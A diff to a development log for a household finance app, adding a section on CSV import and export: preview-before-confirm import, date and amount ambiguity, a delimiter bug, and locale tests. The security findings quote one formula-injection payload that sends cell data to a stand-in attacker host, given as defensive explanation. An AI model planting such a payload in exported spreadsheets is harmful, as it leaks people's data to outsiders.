@@ -1339,8 +1339,7 @@ the Dockerfile ships — run twice, with identical results.
 
 ### Not done in Phase 5
 
-- **CSV import and export**, which `docs/implementation/roadmap.md` lists
-  under this phase. The domain support exists — `parseAmountToMinor` and
+- ~~**CSV import and export**~~ — done in Phase 5b below. The domain support existed — `parseAmountToMinor` and
   `formatMinorAsDecimal` were written for it and are tested against the
   awkward cases — but the confirm-before-writing import flow that ADR-015
   commits to is a vertical slice of its own, and shipping the parser
@@ -1352,3 +1351,115 @@ the Dockerfile ships — run twice, with identical results.
   deserves a better answer than that.
 - **Linking an expense to a case**, the obvious next connection, which
   waits on the same document-reference work Phase 3 deferred.
+
+---
+
+## Phase 5b: CSV import and export
+
+This closes the item Phase 5 deliberately left open. `docs/implementation/roadmap.md`
+lists CSV under finance; ADR-015 committed to a specific shape for it, and
+that commitment is what made it a slice of its own rather than a parser
+bolted onto the expense form.
+
+### Review before writing, because the parser can be wrong
+
+The amount rule is knowingly ambiguous: `1,234` is one thousand two
+hundred and thirty-four to a German reader and one point two three four to
+an American one, and nothing in a bank CSV settles it. No parser can fix
+that, so the workflow carries the uncertainty instead — **upload, see every
+row and the amount it was read as, then confirm.**
+
+Two properties make that honest rather than decorative:
+
+- **The confirm step re-plans the same text**, not the reviewed rows.
+  `planExpenseImport` is pure and deterministic, so running it again on the
+  same input cannot produce a different answer. The preview and the write
+  are therefore incapable of disagreeing, and nothing structural has to be
+  trusted after a trip through the browser.
+- **Nothing is ever silently dropped.** A row that cannot be read appears
+  in the preview with the reason, and the counts say how many will be
+  imported and how many skipped.
+
+Rows that already exist are flagged, not refused. Two identical coffees on
+one day are a real thing, and so is deliberately re-importing a file; the
+household decides.
+
+### What the reader refuses to guess
+
+- `12/05/2026` is rejected. It is 12 May to half the world and 5 December
+  to the other half, and guessing puts an expense in the wrong month
+  silently. ISO and German dotted dates are accepted.
+- A negative amount is reported as "not a spend" rather than stored. Bank
+  exports mix income and spending; a credit filed as a negative expense
+  would quietly reduce a category total.
+- An unrecognised category is reported rather than quietly filed as
+  `OTHER`.
+
+### Two security findings, both in the export direction
+
+1. **CSV formula injection.** A description of
+   `=HYPERLINK("https://evil.example/?d="&A1,"Click")` executes when the
+   exported file is opened in Excel or LibreOffice, with the household's
+   own data in the request. The export is the dangerous direction
+   precisely because the file leaves the application and the browser's
+   protections with it. `escapeCsvField` applies OWASP's mitigation —
+   prefix the cell with `'`, which spreadsheets treat as literal text.
+   Tested against `=`, `+`, `-`, `@`, tab and CR.
+2. **An export must never be wider than the page.** `exportExpensesCsv`
+   builds the file from `getExpensesForMonth`, the same authorized read the
+   page uses, so it cannot contain a row the page would refuse to show. An
+   integration test asserts a `CHILD` gets a header and nothing else. The
+   route handler also re-reads the session itself, sets `no-store`, and
+   returns 401 rather than redirecting — a caller that asked for a file
+   should get a refusal it can recognise, not a sign-in page with a 200.
+
+### A delimiter bug the tests caught
+
+The first delimiter detector counted separators outside quotes. That is
+wrong on realistic data: in `"Müller, Zahnarzt";89,90` there is exactly one
+comma and one semicolon outside the quotes, so the count ties and has to
+guess — and guessing comma splits the amount in half. It now parses with
+each candidate and judges the result: comma leaves a quoted field with text
+stuck to its closing quote, which well-formed CSV never has. Ordered by
+fewest malformed fields, then a consistent column count, then most
+columns.
+
+### Locale parity is now enforced
+
+`tests/unit/i18n-parity.spec.ts` asserts that both catalogues carry the
+same keys, that no value is an empty string, and that a message uses the
+same ICU arguments in both languages. next-intl throws on a missing key
+rather than falling back, so a key added in English and forgotten in German
+is a crash on that page for a German-speaking household — and neither a
+typecheck nor an English-language test would notice. Phase 2 already
+shipped one render-time message bug that 103 green tests missed.
+
+The placeholder check needed a second attempt: a naive `\{(\w+)` reads a
+plural branch body like `{No rows can be imported}` as an argument named
+"No", which produced five false positives on existing messages. It now
+requires the identifier to be followed by `,` or `}`. That is an
+approximation rather than an ICU parser, and the comment says so.
+
+### No new dependency
+
+`domain/finance/csv.ts` is about sixty lines and fully tested. A CSV
+library would also bring streaming, type coercion and a transform pipeline
+this app has no use for, and its escaping would still have to be audited
+for the formula-injection problem above, which most CSV writers do not
+address. CLAUDE.md §16 asks for that reasoning to be written down rather
+than assumed.
+
+### Verified
+
+`tsc --noEmit`, `eslint .`, 357 unit and integration tests, `next build`,
+and 87 E2E tests (2 skipped by project gate) against the standalone
+bundle. The import preview also gets its own axe sweep inside the journey,
+because it is markup that only exists after an upload and the page-level
+accessibility test never sees it — and its own horizontal-overflow guard,
+for the same reason.
+
+### Known limitation
+
+The preview is capped at 1000 rows and 1 MB. A larger file has to be split.
+Streaming it would mean giving up the "review the whole thing first"
+property, which is the feature.
